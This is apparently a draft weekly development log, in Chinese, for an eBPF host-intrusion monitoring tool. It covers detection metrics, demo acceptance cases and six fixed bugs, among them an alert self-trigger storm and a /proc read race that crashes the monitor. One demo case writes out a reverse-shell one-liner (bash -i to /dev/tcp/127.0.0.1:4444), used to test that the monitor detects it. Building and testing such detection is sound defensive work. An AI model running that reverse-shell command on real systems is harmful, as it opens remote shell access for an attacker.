# W2 开发日志：遥测层五类事件全量打通——以及 6 个把 monitor 打爆的真实 bug

> 状态：草稿（待发布知乎/GitHub）
> 本周一句话：**eBPF 遥测层（进程/网络/DNS/权限/命名空间）五类事件全量打通，攻击行为从内核到告警全链路可见；验收过程抓出并修复 6 个真实缺陷，其中 1 个可致监控进程直接崩溃。**

## 本周数据（实测）

| 指标 | 实测值 | 目标 |
|---|---|---|
| 事件落库总量（约 1 小时测试） | 1426+ 条 | — |
| 事件类型覆盖 | exec 663 / setuid 444 / connect 135 / dns 100 / capset 39 / mount 2 | 五类全通 |
| 进程链缺失率 | **0 / 1426（0%）** | < 5% |
| 命令执行→落库可查 | **248ms**（p95 197ms） | ≤ 2s |
| 队列排队延迟 | avg 386µs / p95 1.4ms | — |

## Demo 素材索引（本仓库验收实测）

1. **探针加载**：4 类探针 attach 成功（lsm_file / net_watch / priv_watch / proc_watch），日志 `/tmp/monitor_w2.log`
2. **反弹 shell 全链路**：`bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'`
   - exec 事件 ×2（外层 bash -c + 内层反弹 bash，pid 6739/6740）
   - connect 事件：127.0.0.1:4444，进程归属 bash
   - whoami 子进程 exec（ppid=6740，反弹 shell 内执行）
3. **进程链富化**：反弹 bash 祖先链 8 层（bash→timeout→bash→node→node→sh→code-server→sh→sshd），事件库 `events.db` 的 `events` 表 payload 可查
4. **chmod 实时告警**：`chmod 777` 触发 `perm_changed`（medium），带操作者上下文 `proc=chmod pid=6628`，alerts 表 + CLI `alerts` 可查
5. **HTML 报表**：`baseline-guard report -o w2_demo_report.html`

## 踩坑记录（本周核心价值）

验收按攻击用例逐项手工执行，**五个用例踩出 6 个真实 bug**。按爆炸程度排序：

### 1. 告警自激风暴：monitor 18 秒被刷爆 3.7 万条
`process_event_core` 对**每个** read/write 事件都执行 `CompareWithBaseline`（要读文件算 SHA256）。
而这个"读文件"本身又会触发 LSM `file_permission` 钩子 → 产生新 read 事件 → 再比对 → 死循环。
18 秒产出 37603 条 VIOLATION，后台日志 16MB 直接把监控进程输出管道打爆。
**修复**：read 事件跳过完整性比对（读不改变文件）；写/属性变更加 2s 去抖。
**教训**：监控系统的"检测动作"必须假设自己也在被监控之中。

### 2. read 事件检测：一个从项目诞生起就存在的位运算 bug
file_permission 钩子的 mask 是内核位（MAY_READ=4 / MAY_WRITE=2），
代码却用自定义事件位 EVENT_READ=1 去 `mask & EVENT_READ`——读检测**永不命中**。
write 能工作纯属巧合：MAY_WRITE 和 EVENT_WRITE 都是 2。
也就是说此前的"读监控"功能从未真正生效过。
**修复**：显式对齐内核位，上报前归一化为自定义语义。

### 3. chmod 检测链路三层全断
配置解析不认 `chmod` 事件 → 用户态注册不进 CHMOD 位 → BPF 侧 `path_chmod` 的位检查必失败。
基线注册同理（只注册 READ|WRITE）。
**修复**：配置解析 + 规则注册 + 基线注册三处补齐 CHMOD/CHOWN 位。

### 4. /proc 读取竞态：一个会让 monitor 当场去世的异常
`ResolveUserInfoByPid` 读 `/proc/<pid>/status` 解析用户名。
目标进程恰好在 open 成功、getline 之前退出 → read() 返回 ESRCH →
**libstdc++ 的 basic_filebuf::underflow 会直接抛 ios_failure**（不看出流的 exceptions mask，GCC11+ 行为），
异常穿透整个事件处理线程 → `std::terminate` → 监控进程消失。
安全工具自己崩了，这比不告警严重得多。
**修复**：/proc 读取、SHA256 计算两处全部 try-catch 兜底，按"未知用户/跳过本次检查"降级。

### 5. 告警节流只节流钉钉、不节流数据库
节流窗口内 "skip DingTalk but persist to DB"——风暴一来，3.7 万条重复记录直接刷进 SQLite。
**修复**：throttled 时 DB 持久化一并跳过（窗口首条已入库）。

### 6. 告警冷却被"自己人"抢占
boot check（开机自检）和实时篡改检测共用 `baseline` 规则 ID 的节流键：
自检检出一次权限偏离后，300 秒内真实的 chmod 告警**永远进不了库**。
**修复**：自检/离线核查走独立规则 `baseline-check`，与实时 `baseline` 告警冷却隔离。

## 下周预告（W3）

- FIM 增强：文件事件关联进程上下文（当前文件事件走 alerts 链路，未入 events 表，进程链富化未覆盖文件类）
- exec 事件采集 argv/cmdline（当前 proc_event 结构未采集，反弹 shell 命令行不可见——验收发现的已知边界）
- 资产清点模块启动
